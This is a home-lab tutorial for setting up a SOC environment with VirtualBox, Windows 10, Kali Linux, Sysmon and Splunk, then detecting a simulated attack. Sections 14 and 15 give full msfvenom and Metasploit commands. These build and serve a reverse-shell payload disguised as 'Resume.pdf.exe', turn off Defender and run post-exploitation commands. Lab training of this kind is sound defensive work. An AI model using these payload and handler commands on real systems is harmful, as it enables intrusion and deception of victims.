# SOC-SIEM

#1 Prerequisites
Ensure you have the following components prepared before beginning the SOC home lab setup:

#Component	Description
Memory (RAM)	At least 16 GB recommended for stable performance with multiple VMs
Virtualization Software	VirtualBox or VMware Workstation to create and manage virtual machines
Operating System ISOs	Official ISO files for Windows 10 and Kali Linux
Security Tools	Splunk and Sysmon installers for log collection and analysis
Internet Connection	Required for downloading tools, updates, and initial configuration
# 2 Install VirtualBox
Visit https://www.virtualbox.org.

Download the latest version of VirtualBox for your OS.

Run the installer and complete the installation.

If you encounter errors related to missing dependencies (especially on Linux), follow the prompts or install the required packages manually.
üí° Tip: If your C: drive has low storage, you can save VMs to another drive like D:/ or E:/.

# 3 Plan Your Lab Setup
We‚Äôll create a simulated environment using virtual machines:

Windows 10 ‚Äî main machine (target/victim), will run Sysmon and Splunk.

Kali Linux ‚Äî attacker machine for simulating threats.

Feel free to customize with more machines (like Ubuntu for ELK stack, Security Onion, etc.) as your system allows.

#4 Get a Windows 10 ISO Image
There are several ways to install Windows 10, including using third-party ISO files or pre-made images. However, creating your own Windows ISO image using Microsoft's official tool is one of the safest and most reliable methods.

üîó Link:
https://www.microsoft.com/en-ca/softwaredownload/windows10

‚ö†Ô∏è Note: You‚Äôll need a valid license key to activate Windows 10 later.

üì• Steps:
Click Download tool now.

Run the downloaded MediaCreationTool.

Accept the license terms.

Select:

‚úÖ Create installation media (USB flash drive, DVD, or ISO file) for another PC

Click Next

Choose language, edition, and architecture, or leave "Use the recommended options" checked.

Select ISO file as the output format.

Save the ISO file to your preferred location.

#5 Set Up the Windows 10 Virtual Machine
Open VirtualBox, click New.

Enter name: Windows 10.

Select the ISO image you just created.

Skip unattended installation to install the OS manually (optional).

Assign resources:

RAM: at least 2‚Äì4 GB (more if you can)

CPU: Minimum 1 core, 2 cores recommended for smoother performance

Keep virtual hard disk settings as default (dynamically allocated is fine).

Review settings and click Finish.

Power on the VM.

#6 Install Windows 10
Choose language, region, and keyboard layout.

When asked for a product key, click ‚ÄúI don‚Äôt have a product key‚Äù.

Select the edition to install (e.g., Windows 10 Pro).

Accept the license agreement.

Choose ‚ÄúCustom: Install Windows only (advanced)‚Äù.

Select the virtual disk and click Next.

Windows will now begin installation.

#7 Install Kali Linux
Download the official Kali Linux virtual machine image for easy import into VirtualBox.

üîó Link:
https://www.kali.org/get-kali/#kali-virtual-machines

You have two options:
‚úÖ Pre-built VM (quickest, recommended)

üîß Manual install via ISO (similar to Windows install)

Once downloaded:

Extract the .ova file if needed.

Open VirtualBox ‚Üí File ‚Üí Import Appliance.

Import the Kali Linux VM and power it on.

#8 Installing Sysmon and Splunk Before Isolation
Once you've set up the internal network and isolated the virtual machines, they will no longer have internet access. Therefore, make sure you complete the installations of Sysmon and Splunk while the network is still in NAT mode (the default setting). Once this is done, you can proceed to network isolation safely.

To recap:

Objective: The goal is to generate telemetry on the Windows target machine so you can detect attacker behavior.

We‚Äôll simulate a basic attack workflow:

Use Nmap from Kali to scan for open ports on the Windows machine.

Disable Windows Defender.

Execute a custom malware to establish a reverse TCP shell.

Then observe what telemetry (logs and events) are generated using Sysmon and Splunk.

üîß Tool Installation (Windows VM)
Install Splunk Enterprise

Go to: https://www.splunk.com

Download and install Splunk Enterprise on your Windows VM.

Install Sysmon

Download from Microsoft: Sysmon

Download Olaf Hartong‚Äôs configuration (üí° Big thanks to Olaf Hartong for his outstanding work on Sysmon Modular ‚Äì this configuration makes deep endpoint visibility much more accessible.) file: sysmonconfig.xml

Right-click the config link ‚Üí Save As ‚Üí sysmonconfig.xml

Set Up Sysmon

Extract the downloaded Sysmon zip.

Open PowerShell as Administrator.

cd to the directory containing both sysmon64.exe and sysmonconfig.xml.

Run:

.\Sysmon64.exe -i .\sysmonconfig.xml
Accept license terms when prompted.

Verify Sysmon Installation

Open Services, search for Sysmon.

Alternatively, use Event Viewer ‚Üí Applications and Services Logs ‚Üí Microsoft ‚Üí Windows ‚Üí check for Sysmon.

üí° Tip: If you're new to Splunk, check out the Splunk Fundamentals 1 course (free): üîó https://www.splunk.com/en_us/training/splunk-fundamentals.html

#9 Configuring Virtual Machine Networking Securely
When setting up virtual machines, default settings are usually fine for general use. However, if you're planning to analyze malware or potentially harmful software, using default networking configurations may put your host machine at risk.

This guide primarily uses VirtualBox, but instructions for VMware Workstation are also provided for users who prefer that platform.

üõ°Ô∏è How to Reduce the Risk?
To minimize the chance of infecting your host system during malware analysis, the key area to focus on is network configuration.

In VirtualBox, you can adjust this by:

Selecting your VM

Clicking Settings ‚Üí Network

Changing the "Attached to:" dropdown under the Adapter 1 tab

You‚Äôll see several network options. Here's a brief explanation of each:

Network Mode	Description
NAT (default)	VM accesses external network (internet) through the host. Safe and good for general use, but not ideal for malware analysis.
Bridged Adapter	VM connects directly to the same network as the host. It behaves like a physical machine on the same LAN. Not recommended for malware testing.
Internal Network	Only VMs on the same internal network can communicate with each other. No internet or host access. Safer for malware isolation.
Host-only Adapter	Allows VM to communicate only with the host and other host-only VMs. No external internet. Great for analysis and containment.
Generic Driver	Advanced option requiring custom drivers‚Äîrarely used and generally unnecessary.
NAT Network	Similar to NAT, but allows multiple VMs to communicate with each other behind a shared NAT. Useful for isolated multi-VM setups.
Cloud Network (Experimental)	Integrates with Oracle Cloud. Not stable or recommended for general use.
Not Attached	The VM has no network connection at all. Completely isolated‚Äîmost secure for analyzing malware.
‚úÖ Reminder: For malware analysis, use "Host-only Adapter", "Internal Network", or "Not Attached" to reduce exposure to your host and external networks.

#10 Malware Analysis Configuration (Recommended)
When analyzing malware, it‚Äôs essential to isolate the virtual machines from the internet and your host system. The Internal Network option is ideal in this case. This mode places your virtual machines in a completely separate network with no internet access or LAN access. You‚Äôll need to manually assign IP addresses for each VM.

‚ùó Note:
Avoid using Generic Driver or Cloud Network unless you're confident about their configurations. They are rarely used and not recommended for malware labs.

11 Step-by-Step Configuration in VirtualBox
Step 1: Configure Internal Network
Configure both Windows and Kali Linux VMs to be on the same isolated internal network:

Windows 10:

Go to Settings ‚Üí Network

Set Attached to: Internal Network

Name: test

Click OK

Kali Linux:

Go to Settings ‚Üí Network

Set Attached to: Internal Network

Name: test

Click OK

‚úÖ Reminder: Ensure both VMs use the exact same network name (test) so they can communicate.

Step 2: Assign Static IP Addresses
Since the Internal Network has no DHCP server, you need to assign static IPs manually.

ü™ü On Windows 10:
Boot the VM

Right-click the globe icon in the system tray ‚Üí Open Network & Internet Settings

Click Change adapter options

Right-click the Ethernet adapter ‚Üí Properties

Select Internet Protocol Version 4 (TCP/IPv4) ‚Üí Properties

Select Use the following IP address

IP Address: 192.168.20.10

Click OK

‚úÖ Now open CMD and type ipconfig to verify the assigned IP.

üê±‚Äçüíª On Kali Linux:
Boot the VM

Click the Ethernet icon (top right corner)

Select Edit Connections ‚Üí Choose the wired connection

Click the ‚öôÔ∏è (gear) icon ‚Üí Go to IPv4 Settings

Set Method to Manual

Click Add under Addresses:

IP Address: 192.168.20.11

Netmask: 24

Click Save

‚úÖ Open a terminal and run ifconfig to confirm the IP.

##Step 3: Test Connectivity
To test communication between the two VMs:

From Kali: Run ping 192.168.20.10

This might fail initially because Windows blocks inbound ICMP traffic by default.
From Windows CMD: Run ping 192.168.20.11

This should work, confirming successful connectivity.
üì∏ Final Step: Take Snapshots
Once everything is configured and working:

Take a snapshot of both Windows and Kali VMs

This allows you to revert to a clean state if anything goes wrong

#12 Equivalent Setup in VMware Workstation
If you're using VMware Workstation, the concept is similar but the naming is different.

Step-by-Step:
In VMware, go to the top menu ‚Üí VM ‚Üí Settings (or press Ctrl + D)

Navigate to Network Adapter

Instead of "Internal Network" (used in VirtualBox), VMware uses LAN Segment for isolated networking

Click the LAN Segments button ‚Üí Add ‚Üí Name it: test ‚Üí Click OK

Now set LAN Segment as the network type and select the test segment from the dropdown

Click OK

Just like in VirtualBox, you‚Äôll need to assign static IPs manually in each VM to ensure they‚Äôre on the same subnet.

Now you're ready to safely analyze malware in an isolated environment using either VirtualBox or VMware.

Thanks! Here's the corrected version of that section with your instruction clearly reflected:

13 Configure inputs.conf to Ingest Sysmon Logs
Head back to your Windows VM and navigate to the following path:

C:\Program Files\Splunk\etc\system\local
If inputs.conf does not exist:
Go to:

C:\Program Files\Splunk\etc\system\default
Copy the file inputs.conf

Paste it into the local folder:

C:\Program Files\Splunk\etc\system\local
üìù Replace the Contents of inputs.conf
üö® Important: Don‚Äôt edit the file manually. Instead, replace everything in inputs.conf with the preconfigured version provided in the GitHub repo.

Go to the lab's GitHub repository.

Locate the file:

inputs.conf
Copy everything in that file.

Open the local inputs.conf file in a text editor (like Notepad).

Delete all existing content in the file.

Paste the copied contents from the GitHub version.

Save and close the file.

This configuration ensures that Splunk is correctly set up to collect all relevant Sysmon logs using the lab's custom settings.

Here's your full rewritten and neatly organized note with all points preserved, formatted clearly for ease of understanding and reference during your lab work or demonstrations:

#14 Malware Generation and Handler Setup Using Metasploit
üìå Step 1: Get the IP Address of Your Kali Machine
We need the IP address of our Kali (attacker) machine to configure the malware:

ifconfig     # or use: ip a
üëâ Take note of your IP address ‚Äì we‚Äôll use this as the LHOST value while generating the malware and setting up the listener.

üîç Step 2: Optional Nmap Reference
Familiarize yourself with nmap options:

nmap -h
Example usage:

nmap -A 192.168.20.10 -Pn
üí£ Step 3: Generate Malware with msfvenom
Explore available payloads:

msfvenom -l payloads
We'll use:

windows/x64/meterpreter_reverse_tcp
Malware Generation Command:
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Kali IP> LPORT=4444 -f exe -o Resume.pdf.exe
Example:

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe
This creates a reverse shell payload.

The output file Resume.pdf.exe will attempt to connect back to the attacker machine on port 4444 (default for Meterpreter).

Verify the file exists:

ls
file Resume.pdf.exe
üß≤ Step 4: Setup a Listener with Metasploit
Launch Metasploit:

msfconsole
Select the multi/handler module:

use exploit/multi/handler
Show current options:

options
Note: The default payload is usually generic/shell_reverse_tcp. We‚Äôll change it to match our malware:

set payload windows/x64/meterpreter/reverse_tcp
Press Tab if unsure‚Äîit helps autocomplete!

Now re-check options:

options
Set the correct LHOST:

set LHOST <Kali IP>
set LHOST 192.168.20.11
Start the listener:

exploit
üéØ You are now listening for connections on port 4444.

üåê Step 5: Share Malware via HTTP Server
In a new terminal tab, make sure you're in the same directory as Resume.pdf.exe, then start a Python HTTP server:

python3 -m http.server 9999
‚úÖ Use any available port (e.g., 9999).

Your Kali machine is now hosting the malware at:

http://192.168.20.11:9999
ü™ü Step 6: On the Windows Test Machine
Disable Windows Defender:

Go to:
Windows Security > Virus & threat protection > Manage Settings

Turn off Real-time Protection

Open browser and visit:

http://192.168.20.11:9999
Download Resume.pdf.exe.
If you see a warning about the file not being commonly downloaded ‚Äî ignore it only for this lab.

Run the file.
If Windows shows a warning, choose Run anyway.

üß™ Step 7: Confirm the Connection
Open Command Prompt as Administrator and run:

netstat -anob
üîç Look for:

An established connection to Kali‚Äôs IP:4444

Check the Process ID (e.g., 10208)

Open Task Manager > Details tab, find that PID ‚Üí it should be Resume.pdf.exe

‚úÖ If yes ‚Äî your malware has executed successfully.

üíª Step 8: Back on Kali ‚Äì You Have a Shell!
In the Metasploit handler, you should now see a session opened.

Type:

help
Try:

shell        # Spawn a shell on victim machine
Test with some useful commands:

net user
net localgroup
ipconfig
You're in! üîì

#15 Investigating Attack Activity in Splunk
Once you've successfully ingested Sysmon logs into Splunk and executed the simulated attack (e.g., Nmap scan and Resume.pdf.exe malware), here‚Äôs how to investigate these activities:

üîç Step 1: Check Nmap Scan Activity
Run the following search in Splunk‚Äôs Search & Reporting app:

index=endpoint 192.168.20.11
This query filters logs where your Kali machine‚Äôs IP appears (as attacker).

Under Fields, look for:

dest_port: If you see only one port (e.g., dest_port=3389), ask:

‚ÄúShould this machine be connecting to our RDP port? Who owns this machine?‚Äù

üß† While this log shows an incoming connection attempt, Sysmon alone doesn't show full Nmap scan behavior (like sequential port scanning). That‚Äôs why:

üõ°Ô∏è It's highly recommended to have a network sensor (e.g., Zeek or Suricata) deployed between your machines. These can detect:

TCP flags

Scanning patterns

Protocol signatures

Without it, the telemetry is limited to what the endpoint sees‚Äîmaking it harder to distinguish between legitimate access and reconnaissance attempts.

ü¶† Step 2: Investigate Malware Execution (Resume.pdf.exe)
To check for events related to the malware file, run:

index=endpoint Resume.pdf.exe
This searches for all logs where the filename Resume.pdf.exe appears.

Under Fields, you‚Äôll typically see multiple EventCodes, such as:

EventCode 1: Process creation

EventCode 3: Network connection

EventCode 7: Image loaded

EventCode 11: File created

(There may be more depending on your Sysmon config)

These events give you visibility into what the malware did, such as:

Which process launched it

What files it accessed

If it initiated a network connection (like reverse TCP)

Which DLLs or system files it loaded

This is crucial for understanding malware behavior post-execution.

‚úÖ Summary
Action	Splunk Query	What to Look For
Detect Nmap activity	index=endpoint 192.168.20.11	Check dest_port, assess if access was suspicious
Investigate malware	index=endpoint Resume.pdf.exe	Review EventCodes (1, 3, 7, 11), trace malware actions
Improve visibility	‚Äî	Deploy a network sensor for full scan detection & TCP analysis
